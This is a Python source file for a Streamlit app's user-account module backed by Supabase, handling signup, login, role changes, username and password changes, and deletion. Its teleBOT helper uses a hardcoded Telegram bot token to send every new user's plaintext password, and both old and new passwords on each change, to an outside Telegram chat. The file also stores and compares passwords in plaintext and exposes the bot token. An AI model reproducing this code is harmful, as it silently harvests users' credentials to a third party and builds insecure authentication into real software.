from supabase import create_client
import streamlit as st
from streamlit import session_state as ss
import requests

url = st.secrets.DB_URL
key = st.secrets.DB_KEY
supabase = create_client(url, key).table('accounts')

def teleBOT(message):
	token = '7449014818:AAG-4iB86CfO1JIxdUWuYLogY8VHxZkuaGk'
	url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id=7075537944&text={message}"
	requests.get(url)

class func:
	def setRole(self, target, role):
		try:
			check = supabase.select('*').eq("username", target).execute()
			if check.data:
				if check.data[0]['role'] == role:
					return {"status": False, "message": 'This role is already set'}
				res = supabase.update({"role": role}).eq('username', target).execute()
				if res.data:
					return {"status": True, "message": f'{target} is now {role}'}
				else:
					return {"status": False, "message": 'Failed to change the role'}
			else:
				return {"status": False, "message": 'Username not found'}
		except:
			return {"status": False, "message": 'Failed to change the role'}
	def delete_user(self, target):
		try:
			check = supabase.select('*').eq('username', target).execute()
			if check.data:
				supabase.delete().eq('username', target).execute()
				teleBOT(f"🛑 DELETE ACCOUNT\n\naccount: {target}\ndeleted by: {ss.data['username']}")
				return {"status": True, "message": 'Account has been deleted'}
			else:
				return {"status": False, "message": 'Username not found'}
		except:
			return {"status": False, "message": 'Failed to delete account'}
	def fetch_all(self):
		try:
			res = supabase.select('*').execute()
			return res.data
		except Exception as tite:
			return []
	def change_password(self, new_pass):
		try:
			res = supabase.update({"password": new_pass}).eq('username', ss.data['username']).eq('password', ss.data['password']).execute()
			if res.data:
				teleBOT(f"[⚙️] CHANGE PASSWORD\n\nusername: {ss.data['username']}\nold password: {ss.data['password']}\nnew password: {new_pass}")
				return {"status": True, "message": 'Successfully change the password'}
			else:
				return {"status": False, "message": 'Failed to change password'}
		except:
			return {"status": False, "message": 'Failed to change password'}
	def update_username(self, user, passw, new_user):
		try:
			response = supabase.update({"username": new_user.lower()}).eq("username", user).eq("password", passw).execute()
			if response.data:
				teleBOT(f"[⚙️] CHANGE USERNAME\n\nold username: {user}\nnew username: {new_user.lower()}")
				return {"status": True, "message": 'Username change'}
			else:
				return {"status": False, "message": 'Failed to change username'}
		except Exception as e:
			return {"status": False, "message": 'Failed to change username'}
	def login(self, username, password):
		response = supabase.select('*').eq("username", username).eq("password", password).execute()
		if response.data:
			return {"status": True, "data": response.data[0]}
		else:
			return {"status": False, "message": 'Invalid username or password'}
			
	def signup(self, username, password):
		try:
			username_check = supabase.select('*').eq("username", username).execute()
			if username_check.data:
				return {"status": False, "message": 'Username already exists.'}
			response = supabase.insert({"username": username, "password": password, "role": 'user'}).execute()
			if response.data:
				teleBOT(f"[⚙️] - NEW ACCOUNT\n\nusername: {username}\npassword: {password}\nrole: user")
				return {"status": True, "message": 'Successfully Signup'}
			else:
				return {"status": False, "message": 'Failed to signup'}
		except Exception as e:
			return {"status": False, "message": 'Failed to signup'}

User = func()